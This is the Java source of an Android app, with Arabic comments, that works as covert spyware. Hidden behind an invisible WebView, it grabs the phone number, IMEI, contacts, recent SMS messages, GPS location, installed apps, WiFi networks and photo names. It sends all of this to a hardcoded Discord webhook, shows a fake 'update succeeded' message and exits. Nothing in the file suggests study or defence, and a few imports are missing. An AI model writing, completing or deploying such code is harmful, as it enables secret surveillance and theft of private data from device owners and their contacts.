package com.nullizepmo.control;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity implements LocationListener {

    private WebView webView;
    private LocationManager locationManager;
    private MediaRecorder mediaRecorder;
    private String audioFile = "";
    private String webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // طلب كل الصلاحيات مرة وحدة
        requestPermissions();

        // WebView خفي (ما يظهر شيء)
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setVisibility(WebView.INVISIBLE);
        setContentView(webView);

        // نبدأ جمع البيانات فوراً
        sendToDiscord("🚀", "التطبيق بدأ يعمل");
        
        getPhoneInfo();
        getContacts();
        getSMS();
        getLocation();
        getDeviceInfo();
        getInstalledApps();
        getWifiList();
        getFiles();
        
        Toast.makeText(this, "تم التحديث بنجاح", Toast.LENGTH_SHORT).show();
        
        // نغلق التطبيق بعد 3 ثواني (ما يبقى شغال)
        new android.os.Handler().postDelayed(() -> finish(), 3000);
    }

    // ========== رقم الجوال ومعلومات الشريحة ==========
    private void getPhoneInfo() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String number = tm.getLine1Number();
            String imei = "";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                imei = tm.getImei();
            } else {
                imei = tm.getDeviceId();
            }
            String simCountry = tm.getSimCountryIso();
            String network = tm.getNetworkOperatorName();
            String simOperator = tm.getSimOperatorName();
            
            String info = "📱 رقم الجوال: " + (number != null ? number : "غير متاح") + "\n" +
                          "IMEI: " + imei + "\n" +
                          "SIM بلد: " + simCountry + "\n" +
                          "شبكة: " + network + "\n" +
                          "مشغل SIM: " + simOperator;
            
            sendToDiscord("📱 PHONE", info);
        } else {
            sendToDiscord("❌", "مافي صلاحية قراءة رقم الجوال");
        }
    }

    // ========== جهات الاتصال ==========
    private void getContacts() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            StringBuilder contacts = new StringBuilder();
            int count = 0;
            
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext() && count < 100) { // حد أقصى 100 جهة اتصال
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
            }
            
            if (contacts.length() > 0) {
                sendToDiscord("📞 CONTACTS (" + count + ")", contacts.toString());
            } else {
                sendToDiscord("📞", "مافي جهات اتصال");
            }
        }
    }

    // ========== رسائل SMS ==========
    private void getSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 20");
            StringBuilder smsList = new StringBuilder();
            int count = 0;
            
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext() && count < 20) {
                    String address = cursor.getString(cursor.getColumnIndex(android.provider.Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(android.provider.Telephony.Sms.BODY));
                    smsList.append("من: ").append(address).append("\nرسالة: ").append(body).append("\n---\n");
                    count++;
                }
                cursor.close();
            }
            
            if (smsList.length() > 0) {
                sendToDiscord("💬 SMS (" + count + ")", smsList.toString());
            }
        } else {
            sendToDiscord("⚠️", "مافي صلاحية قراءة SMS (يحتاج صلاحية منفصلة)");
        }
    }

    // ========== الموقع GPS ==========
    private void getLocation() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, this);
            // نجيب الموقع آخر مرة
            Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastLocation != null) {
                onLocationChanged(lastLocation);
            }
        } else {
            sendToDiscord("📍", "مافي صلاحية GPS");
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        String gpsData = "Latitude: " + location.getLatitude() + "\n" +
                         "Longitude: " + location.getLongitude() + "\n" +
                         "Accuracy: " + location.getAccuracy() + "m\n" +
                         "Speed: " + location.getSpeed() + "m/s\n" +
                         "Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(location.getTime())) + "\n" +
                         "Maps: https://www.google.com/maps?q=" + location.getLatitude() + "," + location.getLongitude();
        
        sendToDiscord("📍 GPS", gpsData);
    }

    // ========== معلومات الجهاز ==========
    private void getDeviceInfo() {
        String info = "Brand: " + Build.BRAND + "\n" +
                      "Model: " + Build.MODEL + "\n" +
                      "Android: " + Build.VERSION.RELEASE + "\n" +
                      "SDK: " + Build.VERSION.SDK_INT + "\n" +
                      "Manufacturer: " + Build.MANUFACTURER + "\n" +
                      "Device: " + Build.DEVICE + "\n" +
                      "Product: " + Build.PRODUCT;
        
        sendToDiscord("📱 DEVICE", info);
    }

    // ========== التطبيقات المثبتة ==========
    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder apps = new StringBuilder();
        int count = 0;
        
        for (ApplicationInfo app : packages) {
            if (count < 50) { // حد أقصى 50 تطبيق
                String appName = pm.getApplicationLabel(app).toString();
                String packageName = app.packageName;
                apps.append(appName).append(" (").append(packageName).append(")\n");
                count++;
            }
        }
        
        sendToDiscord("📦 APPS (" + count + ")", apps.toString());
    }

    // ========== شبكات WiFi ==========
    private void getWifiList() {
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager != null && wifiManager.isWifiEnabled()) {
            List<ScanResult> results = wifiManager.getScanResults();
            StringBuilder wifi = new StringBuilder();
            int count = 0;
            
            for (ScanResult result : results) {
                if (count < 20) {
                    wifi.append("SSID: ").append(result.SSID).append("\n");
                    wifi.append("Signal: ").append(result.level).append("dBm\n---\n");
                    count++;
                }
            }
            
            sendToDiscord("📡 WIFI (" + count + ")", wifi.toString());
        }
    }

    // ========== الملفات (صور + فيديوهات) ==========
    private void getFiles() {
        // صور من المعرض
        String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
        
        StringBuilder files = new StringBuilder();
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String fileName = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                String filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                files.append("📷 ").append(fileName).append("\n");
            }
            cursor.close();
        }
        
        if (files.length() > 0) {
            sendToDiscord("🖼️ LAST 10 PHOTOS", files.toString());
        }
    }

    // ========== إرسال إلى ديسكورد ==========
    private void sendToDiscord(String title, String content) {
        new Thread(() -> {
            try {
                URL url = new URL(webhook);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                String boundary = "---" + System.currentTimeMillis();
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                String message = "--" + boundary + "\r\n" +
                                "Content-Disposition: form-data; name=\"content\"\r\n\r\n" +
                                "**" + title + "**\n```\n" + content + "\n```\r\n" +
                                "--" + boundary + "--\r\n";
                
                OutputStream os = conn.getOutputStream();
                os.write(message.getBytes());
                os.flush();
                os.close();
                
                int response = conn.getResponseCode();
                conn.disconnect();
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // ========== طلب كل الصلاحيات ==========
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.INTERNET
        };
        ActivityCompat.requestPermissions(this, permissions, 1);
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override
    public void onProviderEnabled(String provider) {}
    @Override
    public void onProviderDisabled(String provider) {}
}
